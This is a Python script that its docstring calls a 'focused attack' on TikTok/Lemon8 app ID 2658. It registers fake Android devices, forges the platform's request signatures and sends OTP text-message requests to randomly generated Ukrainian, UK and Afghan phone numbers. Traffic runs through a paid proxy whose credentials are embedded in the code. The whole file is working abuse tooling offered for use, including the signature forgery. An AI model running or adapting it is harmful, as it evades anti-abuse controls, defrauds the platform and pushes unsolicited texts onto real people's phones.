"""
Focused attack on AID=2658 — slow-paced, fresh phones, minimal requests.
Goal: Get actual SUCCESS (msg="success"), not just ec=7.
"""
import requests, random, time, json, hashlib, uuid, urllib3
from urllib.parse import urlencode

urllib3.disable_warnings()
from SignerPy import sign as sp_sign, xor

PROXY = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-US:j8BogunPuMmSaOEU@geo.g-w.info:10080'
REGISTER_DOMAIN = "api3-normal-c-lf.amemv.com"

# Try both app_names for AID=2658
CONFIGS = [
    {"aid": 2658, "app_name": "musical_ly", "note": "mly"},
    {"aid": 2658, "app_name": "lemon8", "note": "lemon8"},
    {"aid": 2658, "app_name": "lemon8_app", "note": "lemon8_app"},
    {"aid": 2658, "app_name": "Lemon8", "note": "Lemon8"},
]

# Only try a FEW high-value domains, slowly
TARGET_DOMAINS = [
    "api16-normal-c-useast2a.tiktokv.com",
    "api16-normal-v6.tiktokv.com",
    "api.lemon8-app.com",
    "api2-16-h2.musical.ly",
    "api-h2.tiktokv.com",
]

TYPE_CODES = [3635, 3637, 3634, 3631, 3733, 3734]
BRANDS = {"Samsung": ["SM-G991B"], "Google": ["Pixel 7"]}

def fresh_phone():
    prefix = random.choice(['+38050','+38067','+38096','+38097','+447700','+447701','+93070','+93078'])
    return prefix + str(random.randint(1000000, 9999999))

def register_device(aid, app_name):
    brand = random.choice(list(BRANDS.keys()))
    model = random.choice(BRANDS[brand])
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4())
    ts = int(time.time())
    params = {"aid": str(aid), "app_name": app_name, "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "os_api": "33", "os_version": "13",
              "device_type": model, "device_brand": brand, "language": "en", "ac": "wifi",
              "channel": "googleplay", "resolution": "1080*2400", "dpi": "420",
              "openudid": openudid, "cdid": cdid, "ts": str(ts), "_rticket": str(ts*1000)}
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": f"App_{aid}", "update_version_code": 350804, "manifest_version_code": 350804,
        "aid": aid, "channel": "googleplay", "package": "com.zhiliaoapp.musically",
        "app_version": "35.8.4", "version_code": 350804, "sdk_version": "2.14.0-rc.8",
        "os": "Android", "os_version": "13", "os_api": 33, "device_model": model, "device_brand": brand,
        "device_manufacturer": brand, "cpu_abi": "arm64-v8a", "release_build": "f66b21c_20241009",
        "density_dpi": 420, "display_density": "xxhdpi", "resolution": "1080x2400", "language": "en",
        "timezone": 5, "access": "wifi", "cdid": cdid, "sig_hash": "aea615ab",
        "openudid": openudid, "clientudid": str(uuid.uuid4()), "region": "US"}, "_gen_ts": ts})
    url = f"https://{REGISTER_DOMAIN}/service/2/device_register/?{urlencode(params)}"
    ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android 13; en_US; {model}; Build/TQ3A.230901.001)"
    s = requests.Session(); s.proxies = {"http": PROXY, "https": PROXY}
    try:
        r = s.post(url, data=body, headers={"Host": REGISTER_DOMAIN, "User-Agent": ua,
                   "Content-Type": "application/json"}, verify=False, timeout=12)
        if r.status_code == 200:
            d = r.json()
            return {"device_id": str(d["device_id"]), "iid": str(d["install_id"]),
                    "brand": brand, "model": model, "openudid": openudid, "cdid": cdid, "ua": ua,
                    "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                    "csrf": ''.join(random.choices('0123456789abcdef', k=32))}
    except Exception as e:
        print(f"  register err: {str(e)[:60]}")
    finally: s.close()
    return None

def send_otp(domain, cfg, phone, tc, dev):
    encrypted = xor(phone)
    ts = int(time.time())
    rticket = str(ts * 1000 + random.randint(1000, 9999))
    common = {"passport-sdk-version": "50559", "iid": dev["iid"], "device_id": dev["device_id"],
              "ac": "wifi", "channel": "googleplay", "aid": str(cfg["aid"]),
              "app_name": cfg["app_name"], "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "ssmix": "a",
              "device_type": dev["model"], "device_brand": dev["brand"], "language": "en",
              "os_api": "33", "os_version": "13", "manifest_version_code": "350804",
              "resolution": "1080*2400", "dpi": "420", "update_version_code": "350804",
              "cdid": dev["cdid"], "carrier_region": "PK"}
    url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(ts)
    body_p = dict(common)
    body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                   "mix_mode": "1", "mobile": encrypted, "type": str(tc),
                   "_rticket": rticket, "ts": str(ts)})
    url_str = urlencode(url_p); body = urlencode(body_p)
    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"
    sigs = sp_sign(params=url_str, payload=body, cookie=cookies, version=8404, aid=cfg["aid"])
    headers = {"Host": domain, "Cookie": cookies, "X-SS-REQ-TICKET": rticket,
               "sdk-version": "2", "passport-sdk-version": "50559",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-SS-DP": str(cfg["aid"]), "User-Agent": dev["ua"],
               "X-Gorgon": sigs.get("x-gorgon",""), "X-Khronos": sigs.get("x-khronos",str(ts)),
               "X-Argus": sigs.get("x-argus",""), "X-Ladon": sigs.get("x-ladon",""),
               "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper())}
    url = f"https://{domain}/passport/mobile/send_code/v1/?{url_str}"
    s = requests.Session(); s.proxies = {"http": PROXY, "https": PROXY}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=15)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": (d.get("data",{}).get("description","") or "")[:100] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:50]}
    finally: s.close()

if __name__ == "__main__":
    print("AID=2658 FOCUSED ATTACK")
    print("="*60)
    results = []
    for cfg in CONFIGS:
        for domain in TARGET_DOMAINS:
            for tc in TYPE_CODES:
                phone = fresh_phone()
                print(f"\n[{cfg['note']:8} | {domain:45} | tc={tc}] phone={phone}")
                dev = register_device(cfg["aid"], cfg["app_name"])
                if not dev:
                    print("  register failed")
                    time.sleep(3)
                    continue
                r = send_otp(domain, cfg, phone, tc, dev)
                print(f"  -> status={r['status']} msg={r['msg']!r} ec={r['ec']} desc={r['desc']!r}")
                if r["msg"] == "success":
                    print("  >>> SUCCESS! <<<")
                    results.append({"cfg": cfg, "domain": domain, "tc": tc, "phone": phone, "result": r})
                time.sleep(3)
    
    print(f"\n\n=== Total SUCCESS: {len(results)} ===")
    for r in results: print(r)
    with open("/home/ubuntu/aid2658_results.json","w") as f:
        json.dump(results, f, indent=2, default=str)
